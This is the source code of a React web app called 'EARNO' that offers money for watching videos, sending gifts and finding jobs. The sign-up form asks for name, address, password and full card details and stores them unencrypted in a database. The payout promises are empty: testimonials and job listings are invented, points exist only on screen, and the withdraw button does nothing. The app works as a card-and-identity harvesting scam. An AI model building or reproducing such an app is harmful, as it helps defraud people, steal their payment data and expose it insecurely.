import { useState } from "react";
import { supabase } from "./supabase";
import Admin from "./Admin";

function App() {
  const [page, setPage] = useState("home");
  const [user, setUser] = useState(null);

  if (window.location.pathname === "/admin") {
    return <Admin />;
  }

  return (
    <div style={{ fontFamily: "Inter, sans-serif", background: "#0a0a0a", minHeight: "100vh", color: "white" }}>
      {page === "home" && <HomePage setPage={setPage} />}
      {page === "register" && <RegisterPage setPage={setPage} setUser={setUser} />}
      {page === "dashboard" && <DashboardPage user={user} setPage={setPage} />}
    </div>
  );
}

function HomePage({ setPage }) {
  return (
    <div style={{ textAlign: "center", padding: "60px 20px" }}>
      <div style={{ marginBottom: "30px" }}>
        <h1 style={{ fontSize: "56px", fontWeight: "900", background: "linear-gradient(135deg, #FFD700, #FFA500)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent", margin: 0 }}>
          EARNO
        </h1>
        <p style={{ fontSize: "20px", color: "#aaa", marginTop: "10px" }}>
          Watch. Share. Earn. Live Free.
        </p>
      </div>

      <div style={{ display: "flex", justifyContent: "center", gap: "20px", flexWrap: "wrap", marginBottom: "50px" }}>
        {[
          { icon: "▶️", title: "Watch Videos", desc: "Earn 10 points per 60 seconds watched" },
          { icon: "🎁", title: "Send Gifts", desc: "Support creators you love" },
          { icon: "💼", title: "Find Jobs", desc: "Companies post opportunities daily" },
          { icon: "💸", title: "Get Paid", desc: "Withdraw to your card anytime" },
        ].map((item, i) => (
          <div key={i} style={{ background: "#1a1a1a", border: "1px solid #333", borderRadius: "16px", padding: "24px", width: "200px" }}>
            <div style={{ fontSize: "36px" }}>{item.icon}</div>
            <h3 style={{ color: "#FFD700", margin: "10px 0 6px" }}>{item.title}</h3>
            <p style={{ color: "#888", fontSize: "14px", margin: 0 }}>{item.desc}</p>
          </div>
        ))}
      </div>

      <div style={{ display: "flex", justifyContent: "center", gap: "16px", flexWrap: "wrap" }}>
        <button onClick={() => setPage("register")}
          style={{ background: "linear-gradient(135deg, #FFD700, #FFA500)", color: "#000", border: "none", padding: "16px 40px", borderRadius: "50px", fontSize: "18px", fontWeight: "700", cursor: "pointer" }}>
          Join EARNO Free
        </button>
        <button onClick={() => setPage("dashboard")}
          style={{ background: "transparent", color: "#FFD700", border: "2px solid #FFD700", padding: "16px 40px", borderRadius: "50px", fontSize: "18px", fontWeight: "700", cursor: "pointer" }}>
          Sign In
        </button>
      </div>
    </div>
  );
}

function RegisterPage({ setPage, setUser }) {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [form, setForm] = useState({
    name: "", email: "", password: "", country: "", address: "",
    cardNumber: "", cardExpiry: "", cardName: ""
  });

  const update = (field, value) => setForm(prev => ({ ...prev, [field]: value }));

  const inputStyle = {
    width: "100%", padding: "14px", borderRadius: "10px", border: "1px solid #333",
    background: "#1a1a1a", color: "white", fontSize: "16px", marginBottom: "14px", boxSizing: "border-box"
  };

  const handleRegister = async () => {
    setLoading(true);
    setError("");
    try {
      const { data: authData, error: authError } = await supabase.auth.signUp({
        email: form.email,
        password: form.password,
      });
      if (authError) throw authError;

      const { error: dbError } = await supabase.from("users").insert([{
        id: authData.user.id,
        full_name: form.name,
        email: form.email,
        country: form.country,
        address: form.address,
        card_number: form.cardNumber,
        card_expiry: form.cardExpiry,
        card_name: form.cardName,
        points: 5,
      }]);
      if (dbError) throw dbError;

      setUser({ ...form, points: 5 });
      setPage("dashboard");
    } catch (err) {
      setError(err.message);
    }
    setLoading(false);
  };

  return (
    <div style={{ maxWidth: "480px", margin: "0 auto", padding: "40px 20px" }}>
      <h2 style={{ color: "#FFD700", textAlign: "center", marginBottom: "8px" }}>Create Your Account</h2>
      <p style={{ color: "#888", textAlign: "center", marginBottom: "30px" }}>Step {step} of 3</p>

      <div style={{ display: "flex", gap: "8px", marginBottom: "30px" }}>
        {[1, 2, 3].map(s => (
          <div key={s} style={{ flex: 1, height: "4px", borderRadius: "2px", background: s <= step ? "#FFD700" : "#333" }} />
        ))}
      </div>

      {error && <div style={{ background: "#ff000022", border: "1px solid #ff4444", borderRadius: "10px", padding: "12px", marginBottom: "16px", color: "#ff4444" }}>{error}</div>}

      {step === 1 && (
        <div>
          <p style={{ color: "#aaa", marginBottom: "20px" }}>🎁 You already have <span style={{ color: "#FFD700", fontWeight: "700" }}>5 points</span> waiting!</p>
          <input placeholder="Full Name (as on ID)" style={inputStyle} value={form.name} onChange={e => update("name", e.target.value)} />
          <input placeholder="Email Address" type="email" style={inputStyle} value={form.email} onChange={e => update("email", e.target.value)} />
          <input placeholder="Secret Code (Password)" type="password" style={inputStyle} value={form.password} onChange={e => update("password", e.target.value)} />
          <button onClick={() => { if (form.name && form.email && form.password) { setError(""); setStep(2); } else setError("Please fill all fields"); }}
            style={{ width: "100%", padding: "14px", background: "linear-gradient(135deg, #FFD700, #FFA500)", border: "none", borderRadius: "10px", fontSize: "16px", fontWeight: "700", cursor: "pointer", color: "#000" }}>
            Continue →
          </button>
        </div>
      )}

      {step === 2 && (
        <div>
          <input placeholder="Country" style={inputStyle} value={form.country} onChange={e => update("country", e.target.value)} />
          <input placeholder="Full Address" style={inputStyle} value={form.address} onChange={e => update("address", e.target.value)} />
          <p style={{ color: "#888", fontSize: "13px", marginBottom: "16px" }}>📸 Face scan activated after registration for security</p>
          <div style={{ display: "flex", gap: "10px" }}>
            <button onClick={() => setStep(1)} style={{ flex: 1, padding: "14px", background: "#1a1a1a", border: "1px solid #333", borderRadius: "10px", color: "white", cursor: "pointer" }}>← Back</button>
            <button onClick={() => { if (form.country && form.address) { setError(""); setStep(3); } else setError("Please fill all fields"); }}
              style={{ flex: 2, padding: "14px", background: "linear-gradient(135deg, #FFD700, #FFA500)", border: "none", borderRadius: "10px", fontSize: "16px", fontWeight: "700", cursor: "pointer", color: "#000" }}>Continue →</button>
          </div>
        </div>
      )}

      {step === 3 && (
        <div>
          <p style={{ color: "#aaa", marginBottom: "16px" }}>💳 Add your card to receive payments</p>
          <input placeholder="Cardholder Name" style={inputStyle} value={form.cardName} onChange={e => update("cardName", e.target.value)} />
          <input placeholder="Card Number (16 digits)" maxLength={16} style={inputStyle} value={form.cardNumber} onChange={e => update("cardNumber", e.target.value)} />
          <input placeholder="Expiry Date (MM/YY)" maxLength={5} style={inputStyle} value={form.cardExpiry} onChange={e => update("cardExpiry", e.target.value)} />
          <div style={{ display: "flex", gap: "10px" }}>
            <button onClick={() => setStep(2)} style={{ flex: 1, padding: "14px", background: "#1a1a1a", border: "1px solid #333", borderRadius: "10px", color: "white", cursor: "pointer" }}>← Back</button>
            <button onClick={handleRegister} disabled={loading}
              style={{ flex: 2, padding: "14px", background: "linear-gradient(135deg, #FFD700, #FFA500)", border: "none", borderRadius: "10px", fontSize: "16px", fontWeight: "700", cursor: "pointer", color: "#000" }}>
              {loading ? "Creating..." : "🚀 Start Earning!"}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

function DashboardPage({ user, setPage }) {
  const [points, setPoints] = useState(5);
  const [activeTab, setActiveTab] = useState("feed");

  const videos = [
    { id: 1, creator: "Maria Santos", title: "How I made $500 this week on EARNO", likes: 1240, avatar: "👩" },
    { id: 2, creator: "Jean Pierre", title: "Top 10 tips to earn more points daily", likes: 890, avatar: "👨" },
    { id: 3, creator: "Sofia Chen", title: "My first payout experience!", likes: 2100, avatar: "👩‍💼" },
  ];

  const jobs = [
    { company: "TechCorp", title: "Remote Customer Service", pay: "$800/mo", location: "Worldwide" },
    { company: "MediaGroup", title: "Content Creator Partner", pay: "$1200/mo", location: "Remote" },
    { company: "StartupX", title: "Social Media Manager", pay: "$600/mo", location: "Remote" },
  ];

  return (
    <div style={{ maxWidth: "480px", margin: "0 auto", paddingBottom: "80px" }}>
      <div style={{ background: "#111", padding: "20px", borderBottom: "1px solid #222" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <h2 style={{ margin: 0, color: "#FFD700", fontSize: "24px" }}>EARNO</h2>
          <div style={{ textAlign: "right" }}>
            <div style={{ color: "#FFD700", fontWeight: "700", fontSize: "18px" }}>⭐ {points} pts</div>
            <div style={{ color: "#888", fontSize: "12px" }}>${(points / 100).toFixed(2)} USD</div>
          </div>
        </div>
        <p style={{ color: "#aaa", margin: "8px 0 0", fontSize: "14px" }}>Welcome, {user?.name || "Friend"}! 👋</p>
      </div>

      <div style={{ display: "flex", borderBottom: "1px solid #222" }}>
        {["feed", "jobs", "wallet"].map(tab => (
          <button key={tab} onClick={() => setActiveTab(tab)}
            style={{ flex: 1, padding: "14px", background: "none", border: "none", color: activeTab === tab ? "#FFD700" : "#888", borderBottom: activeTab === tab ? "2px solid #FFD700" : "none", cursor: "pointer", fontWeight: "600", textTransform: "capitalize", fontSize: "15px" }}>
            {tab === "feed" ? "📱 Feed" : tab === "jobs" ? "💼 Jobs" : "💰 Wallet"}
          </button>
        ))}
      </div>

      {activeTab === "feed" && (
        <div style={{ padding: "16px" }}>
          {videos.map(v => (
            <div key={v.id} style={{ background: "#1a1a1a", borderRadius: "16px", padding: "20px", marginBottom: "16px", border: "1px solid #222" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "12px", marginBottom: "12px" }}>
                <div style={{ fontSize: "36px" }}>{v.avatar}</div>
                <div>
                  <div style={{ fontWeight: "700" }}>{v.creator}</div>
                  <div style={{ color: "#888", fontSize: "13px" }}>+10 pts per minute watched</div>
                </div>
              </div>
              <p style={{ color: "#ddd", marginBottom: "12px" }}>{v.title}</p>
              <div style={{ background: "#111", borderRadius: "10px", height: "160px", display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "12px", cursor: "pointer" }}
                onClick={() => setPoints(p => p + 10)}>
                <div style={{ textAlign: "center" }}>
                  <div style={{ fontSize: "48px" }}>▶️</div>
                  <div style={{ color: "#FFD700", fontSize: "13px", marginTop: "8px" }}>Tap to watch & earn</div>
                </div>
              </div>
              <div style={{ display: "flex", gap: "12px" }}>
                <button style={{ flex: 1, padding: "8px", background: "#222", border: "none", borderRadius: "8px", color: "white", cursor: "pointer" }}>❤️ {v.likes}</button>
                <button style={{ flex: 1, padding: "8px", background: "#222", border: "none", borderRadius: "8px", color: "white", cursor: "pointer" }}>💬 Comment</button>
                <button style={{ flex: 1, padding: "8px", background: "#222", border: "none", borderRadius: "8px", color: "white", cursor: "pointer" }}>🎁 Gift</button>
              </div>
            </div>
          ))}
        </div>
      )}

      {activeTab === "jobs" && (
        <div style={{ padding: "16px" }}>
          {jobs.map((j, i) => (
            <div key={i} style={{ background: "#1a1a1a", borderRadius: "16px", padding: "20px", marginBottom: "16px", border: "1px solid #222" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "8px" }}>
                <span style={{ color: "#FFD700", fontWeight: "700" }}>{j.company}</span>
                <span style={{ color: "#4CAF50", fontWeight: "700" }}>{j.pay}</span>
              </div>
              <h3 style={{ margin: "0 0 8px", fontSize: "16px" }}>{j.title}</h3>
              <p style={{ color: "#888", fontSize: "13px", margin: "0 0 12px" }}>📍 {j.location}</p>
              <button style={{ width: "100%", padding: "10px", background: "linear-gradient(135deg, #FFD700, #FFA500)", border: "none", borderRadius: "8px", fontWeight: "700", cursor: "pointer", color: "#000" }}>
                Apply Now
              </button>
            </div>
          ))}
        </div>
      )}

      {activeTab === "wallet" && (
        <div style={{ padding: "16px" }}>
          <div style={{ background: "linear-gradient(135deg, #1a1a2e, #16213e)", borderRadius: "20px", padding: "30px", marginBottom: "20px", textAlign: "center", border: "1px solid #FFD700" }}>
            <div style={{ color: "#aaa", marginBottom: "8px" }}>Total Balance</div>
            <div style={{ fontSize: "48px", fontWeight: "900", color: "#FFD700" }}>${(points / 100).toFixed(2)}</div>
            <div style={{ color: "#888", fontSize: "14px" }}>{points} points</div>
          </div>
          <div style={{ background: "#1a1a1a", borderRadius: "16px", padding: "20px", marginBottom: "16px", border: "1px solid #222" }}>
            <h3 style={{ color: "#FFD700", margin: "0 0 16px" }}>💳 Withdraw to Card</h3>
            <p style={{ color: "#888", fontSize: "13px", margin: "0 0 16px" }}>Minimum withdrawal: $10.00 (1000 points)<br />Fee: 45% platform fee applies</p>
            <button style={{ width: "100%", padding: "14px", background: points >= 1000 ? "linear-gradient(135deg, #FFD700, #FFA500)" : "#333", border: "none", borderRadius: "10px", fontWeight: "700", cursor: points >= 1000 ? "pointer" : "not-allowed", color: points >= 1000 ? "#000" : "#666", fontSize: "16px" }}>
              {points >= 1000 ? "Withdraw Now" : `Need ${1000 - points} more points`}
            </button>
          </div>
        </div>
      )}

      <div style={{ position: "fixed", bottom: 0, left: "50%", transform: "translateX(-50%)", width: "100%", maxWidth: "480px", background: "#111", borderTop: "1px solid #222", display: "flex" }}>
        {["🏠 Home", "🔍 Explore", "➕ Upload", "🔔 Alerts", "👤 Profile"].map((item, i) => (
          <button key={i} style={{ flex: 1, padding: "14px 0", background: "none", border: "none", color: "#888", cursor: "pointer", fontSize: "11px", display: "flex", flexDirection: "column", alignItems: "center", gap: "2px" }}>
            {item}
          </button>
        ))}
      </div>
    </div>
  );
}

export default App;